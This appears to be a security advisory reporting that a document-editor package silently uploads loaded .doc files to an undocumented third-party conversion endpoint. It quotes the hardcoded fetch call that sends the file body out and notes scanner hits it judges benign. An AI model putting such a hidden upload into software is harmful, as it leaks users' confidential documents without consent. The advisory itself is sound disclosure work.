summary: Document editor silently uploads.doc files to undocumented third-party endpoint
details: When a consumer application passes a.doc file to this document-editor component via its documented `file` prop, the component POSTs the entire file body to `https://converter-apis.vercel.app/api/convert` for server-side conversion to docx. The destination is hardcoded in `dist/index.js` (`fetch("https://converter-apis.vercel.app/api/convert", { method: "POST", body: new Blob([arrayBuffer], { type: "application/msword" }) })`), is not mentioned in the README (which advertises OnlyOffice / local wasm conversion only), is not configurable, and offers no opt-out. Any document the host application loads through the component — potentially confidential business documents — is transmitted in full to an unrelated Vercel-hosted endpoint not associated with the package author's stated infrastructure. This is a silent-relay shape: caller-supplied data is routed to a third-party destination via the package's normal advertised API. Static patterns also fired on `dist/public/wasm/x2t/x2t.js`, but those (`require('child_process')`, references to kripken.github.io and developer.mozilla.org) are artifacts of the Emscripten-compiled x2t WASM toolchain bundled for in-browser conversion and are not the basis for the verdict.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
